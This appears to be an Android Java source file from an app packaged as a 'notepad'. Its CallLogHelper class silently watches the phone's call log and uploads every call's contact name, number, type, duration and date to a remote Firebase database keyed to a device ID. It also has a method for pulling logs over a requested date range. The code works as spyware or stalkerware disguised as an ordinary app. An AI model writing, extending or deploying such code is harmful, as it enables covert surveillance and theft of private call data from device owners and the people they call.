package com.megh.notepad; // আপনার প্যাকেজের নাম দিন

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class CallLogHelper {

    private static ContentObserver callLogObserver;

    // ১. রেগুলার লাইভ মনিটরিং (আগের মতোই কাজ করবে)
    public static void startMonitoring(final Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e("CallLogHelper", "READ_CALL_LOG permission denied!");
            return;
        }

        if (callLogObserver == null) {
            callLogObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange) {
                    super.onChange(selfChange);
                    Log.d("CallLogHelper", "Change detected! Syncing one by one...");
                    syncCallLogs(context);
                }
            };

            context.getContentResolver().registerContentObserver(
                    CallLog.Calls.CONTENT_URI, true, callLogObserver);
            Log.d("CallLogHelper", "Live monitoring started.");

            // প্রথমবার চালু হওয়ার সময় দ্রুত সিঙ্ক
            syncCallLogs(context);
        }
    }

    public static void stopMonitoring(Context context) {
        if (callLogObserver != null) {
            context.getContentResolver().unregisterContentObserver(callLogObserver);
            callLogObserver = null;
        }
    }

    // ২. ডিফল্ট কল লগ সিঙ্ক (শেষ ৭ দিনের ডেটা)
    private static void syncCallLogs(final Context context) {
        long sevenDaysInMillis = 7L * 24 * 60 * 60 * 1000;
        long thresholdTime = System.currentTimeMillis() - sevenDaysInMillis;
        
        String selection = CallLog.Calls.DATE + " > ?";
        String[] selectionArgs = new String[]{String.valueOf(thresholdTime)};
        
        fetchAndUploadCallLogs(context, selection, selectionArgs, "CallLogs");
    }

    // 🌟 ৩. নতুন ফিচার: নির্দিষ্ট রেঞ্জ (Range) অনুযায়ী কল লগ নেওয়া 🌟
    // startTimeInMillis এবং endTimeInMillis মিলি-সেকেন্ডে দিতে হবে
    public static void syncCallLogsByRange(final Context context, final long startTimeInMillis, final long endTimeInMillis) {
        Log.d("CallLogHelper", "Syncing custom range: " + startTimeInMillis + " to " + endTimeInMillis);
        
        String selection = CallLog.Calls.DATE + " >= ? AND " + CallLog.Calls.DATE + " <= ?";
        String[] selectionArgs = new String[]{String.valueOf(startTimeInMillis), String.valueOf(endTimeInMillis)};
        
        // চাইলে রেঞ্জের ডেটা আলাদা ফোল্ডারে সেভ করতে পারেন, যেমন: "RequestedCallLogs"
        fetchAndUploadCallLogs(context, selection, selectionArgs, "RequestedCallLogs");
    }

    // ৪. কোর ডেটাবেস রিড এবং আপলোড মেথড (যাতে বারবার একই কোড লিখতে না হয়)
    private static void fetchAndUploadCallLogs(final Context context, final String selection, final String[] selectionArgs, final String folderName) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                        return;
                    }

                    DatabaseReference dbRef = FirebaseDatabase.getInstance()
                            .getReference("DeviceData").child(BackgroundService.USER_ID).child(folderName);

                    Cursor cursor = context.getContentResolver().query(
                            CallLog.Calls.CONTENT_URI, 
                            null, 
                            selection, 
                            selectionArgs, 
                            CallLog.Calls.DATE + " DESC"
                    );

                    if (cursor != null && cursor.moveToFirst()) {
                        int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                        int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                        int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                        int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                        int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

                        do {
                            String number = cursor.getString(numberIndex);
                            int type = cursor.getInt(typeIndex);
                            long timestamp = cursor.getLong(dateIndex);
                            int durSec = cursor.getInt(durationIndex);
                            String name = cursor.getString(nameIndex);

                            if (name == null || name.isEmpty()) name = "Unknown Name";

                            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
                            String callDate = sdf.format(new Date(timestamp));

                            String callType = "Other";
                            switch (type) {
                                case CallLog.Calls.INCOMING_TYPE: callType = "Incoming"; break;
                                case CallLog.Calls.OUTGOING_TYPE: callType = "Outgoing"; break;
                                case CallLog.Calls.MISSED_TYPE: callType = "Missed"; break;
                                case CallLog.Calls.REJECTED_TYPE: callType = "Rejected"; break;
                                case CallLog.Calls.BLOCKED_TYPE: callType = "Blocked"; break;
                            }

                            String formattedDuration = (durSec < 60) ? durSec + "s" : (durSec / 60) + "m " + (durSec % 60) + "s";
                            String typeInfo = (callType.equals("Missed") || callType.equals("Rejected")) 
                                              ? callType : callType + " (" + formattedDuration + ")";

                            Map<String, Object> callData = new HashMap<>();
                            callData.put("Name", name);
                            callData.put("Number", number);
                            callData.put("Type", typeInfo);
                            callData.put("Date", callDate);

                            String fbKey = "Time_" + timestamp;
                            dbRef.child(fbKey).updateChildren(callData);

                            Log.d("CallLogHelper", "Sent to Firebase: " + name + " - " + number);

                        } while (cursor.moveToNext());
                        cursor.close();
                    }
                } catch (Exception e) {
                    Log.e("CallLogHelper", "Thread Error: " + e.getMessage());
                }
            }
        }).start();
    }
}

